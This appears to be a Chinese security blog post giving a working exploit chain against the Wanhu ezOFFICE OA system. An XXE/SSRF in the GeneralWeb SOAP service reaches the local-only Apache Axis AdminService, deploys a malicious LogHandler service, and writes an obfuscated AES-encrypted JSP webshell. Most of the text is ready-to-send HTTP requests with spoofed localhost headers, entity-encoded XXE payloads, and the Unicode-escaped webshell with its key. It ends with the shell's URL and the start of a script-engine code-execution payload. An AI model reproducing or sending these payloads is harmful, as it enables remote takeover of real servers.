&lt;gen:input&gt;&amp;#x3c;&amp;#x3f;&amp;#x78;&amp;#x6d;&amp;#x6c;&amp;#x20;&amp;#x76;&amp;#x65;&amp;#x72;&amp;#x73;&amp;#x69;&amp;#x6f;&amp;#x6e;&amp;#x3d;&amp;#x22;&amp;#x31;&amp;#x2e;&amp;#x30;&amp;#x22;&amp;#x20;&amp;#x65;&amp;#x6e;&amp;#x63;&amp;#x6f;&amp;#x64;&amp;#x69;&amp;#x6e;&amp;#x67;&amp;#x3d;&amp;#x22;&amp;#x75;&amp;#x74;&amp;#x66;&amp;#x2d;&amp;#x38;&amp;#x22;&amp;#x3f;&amp;#x3e;&amp;#x0a;&amp;#x3c;&amp;#x21;&amp;#x44;&amp;#x4f;&amp;#x43;&amp;#x54;&amp;#x59;&amp;#x50;&amp;#x45;&amp;#x20;&amp;#x61;&amp;#x61;&amp;#x61;&amp;#x20;&amp;#x5b;&amp;#x0a;&amp;#x3c;&amp;#x21;&amp;#x45;&amp;#x4e;&amp;#x54;&amp;#x49;&amp;#x54;&amp;#x59;&amp;#x20;&amp;#x6e;&amp;#x61;&amp;#x6d;&amp;#x65;&amp;#x20;&amp;#x53;&amp;#x59;&amp;#x53;&amp;#x54;&amp;#x45;&amp;#x4d;&amp;#x20;&amp;#x22;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x67;&amp;#x71;&amp;#x6f;&amp;#x38;&amp;#x71;&amp;#x68;&amp;#x2e;&amp;#x64;&amp;#x6e;&amp;#x73;&amp;#x6c;&amp;#x6f;&amp;#x67;&amp;#x2e;&amp;#x63;&amp;#x6e;&amp;#x22;&amp;#x20;&amp;#x3e;&amp;#x0a;&amp;#x5d;&amp;#x3e;&amp;#x0a;&amp;#x3c;&amp;#x6e;&amp;#x61;&amp;#x6d;&amp;#x65;&amp;#x3e;&amp;#x26;&amp;#x6e;&amp;#x61;&amp;#x6d;&amp;#x65;&amp;#x3b;&amp;#x3c;&amp;#x2f;&amp;#x6e;&amp;#x61;&amp;#x6d;&amp;#x65;&amp;#x3e;&lt;/gen:input&gt;      &lt;/gen:OAManager&gt;   &lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;\n\n\n\n\n\n\n\n\n内网 Axis AdminService 服务漏洞web.xml中配置了AxisServlet，Axis在低版本可通过AdminService服务更新配置文件，添加服务。\n\n\n\n\n\n\n\n在server-config.wsdd中配置了AdminService服务，访问方式为/services/AdminService，但是enableRemoteAdmin为false，意味着只能本地访问，正好可以配合如上SSRF漏洞实现修改配置文件添加恶意服务。\n\n\n\n\n\n\n\n漏洞分析在处理AxisServlet的过程中\norg.apache.axis.transport.http.AxisServlet#doGet    org.apache.axis.transport.http.AxisServlet#processQuery    \torg.apache.axis.transport.http.QSMethodHandler#invoke\n\nQSMethodHandler的invoke方法会从request对象中获取method参数，然后调用this.invokeEndpointFromGet方法。\n\n\n\n\n\n\n\n将method参数拼接到SOAP报文中。\nprivate void invokeEndpointFromGet(MessageContext msgContext, HttpServletResponse response, PrintWriter writer, String method, String args) throws AxisFault &#123;        String body = \"&lt;\" + method + \"&gt;\" + args + \"&lt;/\" + method + \"&gt;\";        String msgtxt = \"&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\"&gt;&lt;SOAP-ENV:Body&gt;\" + body + \"&lt;/SOAP-ENV:Body&gt;\" + \"&lt;/SOAP-ENV:Envelope&gt;\";        ByteArrayInputStream istream = new ByteArrayInputStream(msgtxt.getBytes());        Message responseMsg = null;        try &#123;            AxisServer engine = (AxisServer)msgContext.getProperty(\"transport.http.plugin.engine\");            Message msg = new Message(istream, false);            msgContext.setRequestMessage(msg);            engine.invoke(msgContext);            ...&#125;\n\n\n\n\n\n\n\n\n调用栈\norg.apache.axis.transport.http.AxisServlet#doGet    org.apache.axis.transport.http.AxisServlet#processQuery    \torg.apache.axis.transport.http.QSMethodHandler#invoke    \t\torg.apache.axis.transport.http.QSMethodHandler#invokeEndpointFromGet    \t\t\torg.apache.axis.server.AxisServer#invoke    \t\t\t\torg.apache.axis.handlers.soap.SOAPService#invoke    \t\t\t\t\torg.apache.axis.providers.java.JavaProvider#invoke    \t\t\t\t\torg.apache.axis.providers.java.MsgProvider#processMessage    \t\t\t\t\torg.apache.axis.utils.Admin#AdminService\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n获取AdminService的enableRemoteAdmin配置，为false，则获取源ip是否为127.0.0.1，如果不是，则获取本地ip与源ip进行对比，不一致则报异常。\n\n\n\n\n\n\n\nprocessWSDD方法中，将root作为参数创建WSDDDocument对象，再获取((WSDDEngineConfiguration)config).getDeployment()原来的配置，最后调用deploy执行部署。\n\n\n\n\n\n\n\n漏洞利用org.apache.axis.handlers.LogHandler(文件写入)org.apache.axis.handlers.LogHandler\n\nssrf 添加恶意服务 payload\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;!DOCTYPE aaa [&lt;!ENTITY name SYSTEM \"http://127.0.0.1:7001/defaultroot/services/./AdminService?method=!--%3E%3Cdeployment%20xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%20xmlns%3Ajava%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22%3E%3Cservice%20name%3D%22randomBBB%22%20provider%3D%22java%3ARPC%22%3E%3CrequestFlow%3E%3Chandler%20type%3D%22java%3Aorg.apache.axis.handlers.LogHandler%22%20%3E%3Cparameter%20name%3D%22LogHandler.fileName%22%20value%3D%22..%2Fserver%2Foa%2Fdeploy%2Fjboss-web.deployer%2FROOT.war%2Fshell.jsp%22%20%2F%3E%3Cparameter%20name%3D%22LogHandler.writeToConsole%22%20value%3D%22false%22%20%2F%3E%3C%2Fhandler%3E%3C%2FrequestFlow%3E%3Cparameter%20name%3D%22className%22%20value%3D%22java.util.Random%22%20%2F%3E%3Cparameter%20name%3D%22allowedMethods%22%20value%3D%22*%22%20%2F%3E%3C%2Fservice%3E%3C%2Fdeployment\" &gt;]&gt;&lt;name&gt;&amp;name;&lt;/name&gt;\n\n通过GeneralWeb接口触发SSRF 添加服务\nPOST /defaultroot/xfservices/./GeneralWeb HTTP/1.1Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: SESSIONIDOA=CE51E9EFA8D671515820825DDE46CE04; LocLan=zh_CN; ezofficeDomainAccount=whir; empLivingPhoto=; ezofficeUserPortal=; ezofficePortal3=1; OASESSIONID=509378B8F4156297A82C8899060A9FBE; ezofficeUserName=admin; ezofficePortal0=; SESSIONIDOA=6E31EDD176A235E4A50A1E32A72D2672x-forwarded-for: 127.0.0.1x-originating-ip: 127.0.0.1x-remote-ip: 127.0.0.1x-remote-addr: 127.0.0.1Connection: closeSOAPAction: Content-Type: text/xml;charset=UTF-8Host: 172.20.10.132:7001Content-Length: 5932&lt;soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:gen=\"http://com.whir.service/GeneralWeb\"&gt;   &lt;soapenv:Header/&gt;   &lt;soapenv:Body&gt;      &lt;gen:OAManager&gt;&lt;gen:input&gt;&amp;#x3c;&amp;#x3f;&amp;#x78;&amp;#x6d;&amp;#x6c;&amp;#x20;&amp;#x76;&amp;#x65;&amp;#x72;&amp;#x73;&amp;#x69;&amp;#x6f;&amp;#x6e;&amp;#x3d;&amp;#x22;&amp;#x31;&amp;#x2e;&amp;#x30;&amp;#x22;&amp;#x20;&amp;#x65;&amp;#x6e;&amp;#x63;&amp;#x6f;&amp;#x64;&amp;#x69;&amp;#x6e;&amp;#x67;&amp;#x3d;&amp;#x22;&amp;#x75;&amp;#x74;&amp;#x66;&amp;#x2d;&amp;#x38;&amp;#x22;&amp;#x3f;&amp;#x3e;&amp;#x0a;&amp;#x3c;&amp;#x21;&amp;#x44;&amp;#x4f;&amp;#x43;&amp;#x54;&amp;#x59;&amp;#x50;&amp;#x45;&amp;#x20;&amp;#x61;&amp;#x61;&amp;#x61;&amp;#x20;&amp;#x5b;&amp;#x0a;&amp;#x3c;&amp;#x21;&amp;#x45;&amp;#x4e;&amp;#x54;&amp;#x49;&amp;#x54;&amp;#x59;&amp;#x20;&amp;#x6e;&amp;#x61;&amp;#x6d;&amp;#x65;&amp;#x20;&amp;#x53;&amp;#x59;&amp;#x53;&amp;#x54;&amp;#x45;&amp;#x4d;&amp;#x20;&amp;#x22;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x31;&amp;#x32;&amp;#x37;&amp;#x2e;&amp;#x30;&amp;#x2e;&amp;#x30;&amp;#x2e;&amp;#x31;&amp;#x3a;&amp;#x37;&amp;#x30;&amp;#x30;&amp;#x31;&amp;#x2f;&amp;#x64;&amp;#x65;&amp;#x66;&amp;#x61;&amp;#x75;&amp;#x6c;&amp;#x74;&amp;#x72;&amp;#x6f;&amp;#x6f;&amp;#x74;&amp;#x2f;&amp;#x73;&amp;#x65;&amp;#x72;&amp;#x76;&amp;#x69;&amp;#x63;&amp;#x65;&amp;#x73;&amp;#x2f;&amp;#x2e;&amp;#x2f;&amp;#x41;&amp;#x64;&amp;#x6d;&amp;#x69;&amp;#x6e;&amp;#x53;&amp;#x65;&amp;#x72;&amp;#x76;&amp;#x69;&amp;#x63;&amp;#x65;&amp;#x3f;&amp;#x6d;&amp;#x65;&amp;#x74;&amp;#x68;&amp;#x6f;&amp;#x64;&amp;#x3d;&amp;#x21;&amp;#x2d;&amp;#x2d;&amp;#x25;&amp;#x33;&amp;#x45;&amp;#x25;&amp;#x33;&amp;#x43;&amp;#x64;&amp;#x65;&amp;#x70;&amp;#x6c;&amp;#x6f;&amp;#x79;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;&amp;#x25;&amp;#x32;&amp;#x30;&amp;#x78;&amp;#x6d;&amp;#x6c;&amp;#x6e;&amp;#x73;&amp;#x25;&amp;#x33;&amp;#x44;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x25;&amp;#x33;&amp;#x41;&amp;#x25;&amp;#x32;&amp;#x46;&amp;#x25;&amp;#x32;&amp;#x46;&amp;#x78;&amp;#x6d;&amp;#x6c;&amp;#x2e;&amp;#x61;&amp;#x70;&amp;#x61;&amp;#x63;&amp;#x68;&amp;#x65;&amp;#x2e;&amp;#x6f;&amp;#x72;&amp;#x67;&amp;#x25;&amp;#x32;&amp;#x46;&amp;#x61;&amp;#x78;&amp;#x69;&amp;#x73;&amp;#x25;&amp;#x32;&amp;#x46;&amp;#x77;&amp;#x73;&amp;#x64;&amp;#x64;&amp;#x25;&amp;#x32;&amp;#x46;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x25;&amp;#x32;&amp;#x30;&amp;#x78;&amp;#x6d;&amp;#x6c;&amp;#x6e;&amp;#x73;&amp;#x25;&amp;#x33;&amp;#x41;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x25;&amp;#x33;&amp;#x44;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x25;&amp;#x33;&amp;#x41;&amp;#x25;&amp;#x32;&amp;#x46;&amp;#x25;&amp;#x32;&amp;#x46;&amp;#x78;&amp;#x6d;&amp;#x6c;&amp;#x2e;&amp;#x61;&amp;#x70;&amp;#x61;&amp;#x63;&amp;#x68;&amp;#x65;&amp;#x2e;&amp;#x6f;&amp;#x72;&amp;#x67;&amp;#x25;&amp;#x32;&amp;#x46;&amp;#x61;&amp;#x78;&amp;#x69;&amp;#x73;&amp;#x25;&amp;#x32;&amp;#x46;&amp;#x77;&amp;#x73;&amp;#x64;&amp;#x64;&amp;#x25;&amp;#x32;&amp;#x46;&amp;#x70;&amp;#x72;&amp;#x6f;&amp;#x76;&amp;#x69;&amp;#x64;&amp;#x65;&amp;#x72;&amp;#x73;&amp;#x25;&amp;#x32;&amp;#x46;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x25;&amp;#x33;&amp;#x45;&amp;#x25;&amp;#x33;&amp;#x43;&amp;#x73;&amp;#x65;&amp;#x72;&amp;#x76;&amp;#x69;&amp;#x63;&amp;#x65;&amp;#x25;&amp;#x32;&amp;#x30;&amp;#x6e;&amp;#x61;&amp;#x6d;&amp;#x65;&amp;#x25;&amp;#x33;&amp;#x44;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x72;&amp;#x61;&amp;#x6e;&amp;#x64;&amp;#x6f;&amp;#x6d;&amp;#x42;&amp;#x42;&amp;#x42;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x25;&amp;#x32;&amp;#x30;&amp;#x70;&amp;#x72;&amp;#x6f;&amp;#x76;&amp;#x69;&amp;#x64;&amp;#x65;&amp;#x72;&amp;#x25;&amp;#x33;&amp;#x44;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x25;&amp;#x33;&amp;#x41;&amp;#x52;&amp;#x50;&amp;#x43;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x25;&amp;#x33;&amp;#x45;&amp;#x25;&amp;#x33;&amp;#x43;&amp;#x72;&amp;#x65;&amp;#x71;&amp;#x75;&amp;#x65;&amp;#x73;&amp;#x74;&amp;#x46;&amp;#x6c;&amp;#x6f;&amp;#x77;&amp;#x25;&amp;#x33;&amp;#x45;&amp;#x25;&amp;#x33;&amp;#x43;&amp;#x68;&amp;#x61;&amp;#x6e;&amp;#x64;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x25;&amp;#x32;&amp;#x30;&amp;#x74;&amp;#x79;&amp;#x70;&amp;#x65;&amp;#x25;&amp;#x33;&amp;#x44;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x25;&amp;#x33;&amp;#x41;&amp;#x6f;&amp;#x72;&amp;#x67;&amp;#x2e;&amp;#x61;&amp;#x70;&amp;#x61;&amp;#x63;&amp;#x68;&amp;#x65;&amp;#x2e;&amp;#x61;&amp;#x78;&amp;#x69;&amp;#x73;&amp;#x2e;&amp;#x68;&amp;#x61;&amp;#x6e;&amp;#x64;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x73;&amp;#x2e;&amp;#x4c;&amp;#x6f;&amp;#x67;&amp;#x48;&amp;#x61;&amp;#x6e;&amp;#x64;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x25;&amp;#x32;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x45;&amp;#x25;&amp;#x33;&amp;#x43;&amp;#x70;&amp;#x61;&amp;#x72;&amp;#x61;&amp;#x6d;&amp;#x65;&amp;#x74;&amp;#x65;&amp;#x72;&amp;#x25;&amp;#x32;&amp;#x30;&amp;#x6e;&amp;#x61;&amp;#x6d;&amp;#x65;&amp;#x25;&amp;#x33;&amp;#x44;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x4c;&amp;#x6f;&amp;#x67;&amp;#x48;&amp;#x61;&amp;#x6e;&amp;#x64;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x2e;&amp;#x66;&amp;#x69;&amp;#x6c;&amp;#x65;&amp;#x4e;&amp;#x61;&amp;#x6d;&amp;#x65;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x25;&amp;#x32;&amp;#x30;&amp;#x76;&amp;#x61;&amp;#x6c;&amp;#x75;&amp;#x65;&amp;#x25;&amp;#x33;&amp;#x44;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x2e;&amp;#x2e;&amp;#x25;&amp;#x32;&amp;#x46;&amp;#x73;&amp;#x65;&amp;#x72;&amp;#x76;&amp;#x65;&amp;#x72;&amp;#x25;&amp;#x32;&amp;#x46;&amp;#x6f;&amp;#x61;&amp;#x25;&amp;#x32;&amp;#x46;&amp;#x64;&amp;#x65;&amp;#x70;&amp;#x6c;&amp;#x6f;&amp;#x79;&amp;#x25;&amp;#x32;&amp;#x46;&amp;#x6a;&amp;#x62;&amp;#x6f;&amp;#x73;&amp;#x73;&amp;#x2d;&amp;#x77;&amp;#x65;&amp;#x62;&amp;#x2e;&amp;#x64;&amp;#x65;&amp;#x70;&amp;#x6c;&amp;#x6f;&amp;#x79;&amp;#x65;&amp;#x72;&amp;#x25;&amp;#x32;&amp;#x46;&amp;#x52;&amp;#x4f;&amp;#x4f;&amp;#x54;&amp;#x2e;&amp;#x77;&amp;#x61;&amp;#x72;&amp;#x25;&amp;#x32;&amp;#x46;&amp;#x73;&amp;#x68;&amp;#x65;&amp;#x6c;&amp;#x6c;&amp;#x2e;&amp;#x6a;&amp;#x73;&amp;#x70;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x25;&amp;#x32;&amp;#x30;&amp;#x25;&amp;#x32;&amp;#x46;&amp;#x25;&amp;#x33;&amp;#x45;&amp;#x25;&amp;#x33;&amp;#x43;&amp;#x70;&amp;#x61;&amp;#x72;&amp;#x61;&amp;#x6d;&amp;#x65;&amp;#x74;&amp;#x65;&amp;#x72;&amp;#x25;&amp;#x32;&amp;#x30;&amp;#x6e;&amp;#x61;&amp;#x6d;&amp;#x65;&amp;#x25;&amp;#x33;&amp;#x44;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x4c;&amp;#x6f;&amp;#x67;&amp;#x48;&amp;#x61;&amp;#x6e;&amp;#x64;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x2e;&amp;#x77;&amp;#x72;&amp;#x69;&amp;#x74;&amp;#x65;&amp;#x54;&amp;#x6f;&amp;#x43;&amp;#x6f;&amp;#x6e;&amp;#x73;&amp;#x6f;&amp;#x6c;&amp;#x65;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x25;&amp;#x32;&amp;#x30;&amp;#x76;&amp;#x61;&amp;#x6c;&amp;#x75;&amp;#x65;&amp;#x25;&amp;#x33;&amp;#x44;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x66;&amp;#x61;&amp;#x6c;&amp;#x73;&amp;#x65;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x25;&amp;#x32;&amp;#x30;&amp;#x25;&amp;#x32;&amp;#x46;&amp;#x25;&amp;#x33;&amp;#x45;&amp;#x25;&amp;#x33;&amp;#x43;&amp;#x25;&amp;#x32;&amp;#x46;&amp;#x68;&amp;#x61;&amp;#x6e;&amp;#x64;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x25;&amp;#x33;&amp;#x45;&amp;#x25;&amp;#x33;&amp;#x43;&amp;#x25;&amp;#x32;&amp;#x46;&amp;#x72;&amp;#x65;&amp;#x71;&amp;#x75;&amp;#x65;&amp;#x73;&amp;#x74;&amp;#x46;&amp;#x6c;&amp;#x6f;&amp;#x77;&amp;#x25;&amp;#x33;&amp;#x45;&amp;#x25;&amp;#x33;&amp;#x43;&amp;#x70;&amp;#x61;&amp;#x72;&amp;#x61;&amp;#x6d;&amp;#x65;&amp;#x74;&amp;#x65;&amp;#x72;&amp;#x25;&amp;#x32;&amp;#x30;&amp;#x6e;&amp;#x61;&amp;#x6d;&amp;#x65;&amp;#x25;&amp;#x33;&amp;#x44;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x63;&amp;#x6c;&amp;#x61;&amp;#x73;&amp;#x73;&amp;#x4e;&amp;#x61;&amp;#x6d;&amp;#x65;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x25;&amp;#x32;&amp;#x30;&amp;#x76;&amp;#x61;&amp;#x6c;&amp;#x75;&amp;#x65;&amp;#x25;&amp;#x33;&amp;#x44;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x2e;&amp;#x75;&amp;#x74;&amp;#x69;&amp;#x6c;&amp;#x2e;&amp;#x52;&amp;#x61;&amp;#x6e;&amp;#x64;&amp;#x6f;&amp;#x6d;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x25;&amp;#x32;&amp;#x30;&amp;#x25;&amp;#x32;&amp;#x46;&amp;#x25;&amp;#x33;&amp;#x45;&amp;#x25;&amp;#x33;&amp;#x43;&amp;#x70;&amp;#x61;&amp;#x72;&amp;#x61;&amp;#x6d;&amp;#x65;&amp;#x74;&amp;#x65;&amp;#x72;&amp;#x25;&amp;#x32;&amp;#x30;&amp;#x6e;&amp;#x61;&amp;#x6d;&amp;#x65;&amp;#x25;&amp;#x33;&amp;#x44;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x61;&amp;#x6c;&amp;#x6c;&amp;#x6f;&amp;#x77;&amp;#x65;&amp;#x64;&amp;#x4d;&amp;#x65;&amp;#x74;&amp;#x68;&amp;#x6f;&amp;#x64;&amp;#x73;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x25;&amp;#x32;&amp;#x30;&amp;#x76;&amp;#x61;&amp;#x6c;&amp;#x75;&amp;#x65;&amp;#x25;&amp;#x33;&amp;#x44;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x2a;&amp;#x25;&amp;#x32;&amp;#x32;&amp;#x25;&amp;#x32;&amp;#x30;&amp;#x25;&amp;#x32;&amp;#x46;&amp;#x25;&amp;#x33;&amp;#x45;&amp;#x25;&amp;#x33;&amp;#x43;&amp;#x25;&amp;#x32;&amp;#x46;&amp;#x73;&amp;#x65;&amp;#x72;&amp;#x76;&amp;#x69;&amp;#x63;&amp;#x65;&amp;#x25;&amp;#x33;&amp;#x45;&amp;#x25;&amp;#x33;&amp;#x43;&amp;#x25;&amp;#x32;&amp;#x46;&amp;#x64;&amp;#x65;&amp;#x70;&amp;#x6c;&amp;#x6f;&amp;#x79;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;&amp;#x22;&amp;#x20;&amp;#x3e;&amp;#x0a;&amp;#x5d;&amp;#x3e;&amp;#x0a;&amp;#x3c;&amp;#x6e;&amp;#x61;&amp;#x6d;&amp;#x65;&amp;#x3e;&amp;#x26;&amp;#x6e;&amp;#x61;&amp;#x6d;&amp;#x65;&amp;#x3b;&amp;#x3c;&amp;#x2f;&amp;#x6e;&amp;#x61;&amp;#x6d;&amp;#x65;&amp;#x3e;&lt;/gen:input&gt;      &lt;/gen:OAManager&gt;   &lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;\n\n\n\n\n\n\n\n\n调用\nPOST /defaultroot/services/./randomBBB HTTP/1.1Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: SESSIONIDOA=D7AA7CDC820C702A5A45F51AAB4B677A; LocLan=zh_CN; ezofficeDomainAccount=whir; empLivingPhoto=; ezofficeUserPortal=; ezofficePortal3=1; OASESSIONID=509378B8F4156297A82C8899060A9FBE; ezofficeUserName=admin; ezofficePortal0=; SESSIONIDOA=05A06A3BF1E3D38195AB69663E791C25x-forwarded-for: 127.0.0.1x-originating-ip: 127.0.0.1x-remote-ip: 127.0.0.1x-remote-addr: 127.0.0.1Connection: closeSOAPAction: Content-Type: text/xml;charset=UTF-8Host: 172.20.10.132:7001Content-Length: 3377&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;        &lt;soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"        xmlns:api=\"http://127.0.0.1/Integrics/Enswitch/API\"        xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"        xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"&gt;        &lt;soapenv:Body&gt;        &lt;api:main        soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"&gt;            &lt;api:in0&gt;&lt;![CDATA[&lt;%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%&gt;&lt;%!\\u0063\\u006c\\u0061\\u0073\\u0073\\u0020\\u0055\\u0020\\u0065\\u0078\\u0074\\u0065\\u006e\\u0064\\u0073\\u0020\\u0043\\u006c\\u0061\\u0073\\u0073\\u004c\\u006f\\u0061\\u0064\\u0065\\u0072\\u007b\\u0055\\u0028\\u0043\\u006c\\u0061\\u0073\\u0073\\u004c\\u006f\\u0061\\u0064\\u0065\\u0072\\u0020\\u0063\\u0029\\u007b\\u0073\\u0075\\u0070\\u0065\\u0072\\u0028\\u0063\\u0029\\u003b\\u007d\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u0020\\u0043\\u006c\\u0061\\u0073\\u0073\\u0020\\u0067\\u0028\\u0062\\u0079\\u0074\\u0065\\u0020\\u005b\\u005d\\u0062\\u0029\\u007b\\u0072\\u0065\\u0074\\u0075\\u0072\\u006e\\u0020\\u0073\\u0075\\u0070\\u0065\\u0072\\u002e\\u0064\\u0065\\u0066\\u0069\\u006e\\u0065\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0062\\u002c\\u0030\\u002c\\u0062\\u002e\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068\\u0029\\u003b\\u007d\\u007d%&gt;&lt;%\\u0069\\u0066\\u0020\\u0028\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u002e\\u0067\\u0065\\u0074\\u004d\\u0065\\u0074\\u0068\\u006f\\u0064\\u0028\\u0029\\u002e\\u0065\\u0071\\u0075\\u0061\\u006c\\u0073\\u0028\\u0022\\u0050\\u004f\\u0053\\u0054\\u0022\\u0029\\u0029\\u007b\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\u0020\\u006b\\u003d\\u0022\\u0034\\u0032\\u0037\\u0062\\u0038\\u0032\\u0035\\u0039\\u0037\\u0031\\u0030\\u0061\\u0065\\u0064\\u0030\\u0039\\u0022\\u003b\\u0073\\u0065\\u0073\\u0073\\u0069\\u006f\\u006e\\u002e\\u0070\\u0075\\u0074\\u0056\\u0061\\u006c\\u0075\\u0065\\u0028\\u0022\\u0075\\u0022\\u002c\\u006b\\u0029\\u003b\\u0043\\u0069\\u0070\\u0068\\u0065\\u0072\\u0020\\u0063\\u003d\\u0043\\u0069\\u0070\\u0068\\u0065\\u0072\\u002e\\u0067\\u0065\\u0074\\u0049\\u006e\\u0073\\u0074\\u0061\\u006e\\u0063\\u0065\\u0028\\u0022\\u0041\\u0045\\u0053\\u0022\\u0029\\u003b\\u0063\\u002e\\u0069\\u006e\\u0069\\u0074\\u0028\\u0032\\u002c\\u006e\\u0065\\u0077\\u0020\\u0053\\u0065\\u0063\\u0072\\u0065\\u0074\\u004b\\u0065\\u0079\\u0053\\u0070\\u0065\\u0063\\u0028\\u006b\\u002e\\u0067\\u0065\\u0074\\u0042\\u0079\\u0074\\u0065\\u0073\\u0028\\u0029\\u002c\\u0022\\u0041\\u0045\\u0053\\u0022\\u0029\\u0029\\u003b\\u006e\\u0065\\u0077\\u0020\\u0055\\u0028\\u0074\\u0068\\u0069\\u0073\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u004c\\u006f\\u0061\\u0064\\u0065\\u0072\\u0028\\u0029\\u0029\\u002e\\u0067\\u0028\\u0063\\u002e\\u0064\\u006f\\u0046\\u0069\\u006e\\u0061\\u006c\\u0028\\u006e\\u0065\\u0077\\u0020\\u0073\\u0075\\u006e\\u002e\\u006d\\u0069\\u0073\\u0063\\u002e\\u0042\\u0041\\u0053\\u0045\\u0036\\u0034\\u0044\\u0065\\u0063\\u006f\\u0064\\u0065\\u0072\\u0028\\u0029\\u002e\\u0064\\u0065\\u0063\\u006f\\u0064\\u0065\\u0042\\u0075\\u0066\\u0066\\u0065\\u0072\\u0028\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u002e\\u0067\\u0065\\u0074\\u0052\\u0065\\u0061\\u0064\\u0065\\u0072\\u0028\\u0029\\u002e\\u0072\\u0065\\u0061\\u0064\\u004c\\u0069\\u006e\\u0065\\u0028\\u0029\\u0029\\u0029\\u0029\\u002e\\u006e\\u0065\\u0077\\u0049\\u006e\\u0073\\u0074\\u0061\\u006e\\u0063\\u0065\\u0028\\u0029\\u002e\\u0065\\u0071\\u0075\\u0061\\u006c\\u0073\\u0028\\u0070\\u0061\\u0067\\u0065\\u0043\\u006f\\u006e\\u0074\\u0065\\u0078\\u0074\\u0029\\u003b\\u007d%&gt;]]&gt;            &lt;/api:in0&gt;        &lt;/api:main&gt;  &lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;\n\n\n\n\n\n\n\n\n连接 http://172.20.10.132:7001/shell.jsp ndrqjxdtldybh\n\n\n\n\n\n\n\ncom.sun.script.javascript.RhinoScriptEngine(代码执行)com.sun.script.javascript.RhinoScriptEngine\n\nssrf 触发代码执行 payload\n&lt;?xml version=\"1.0\" 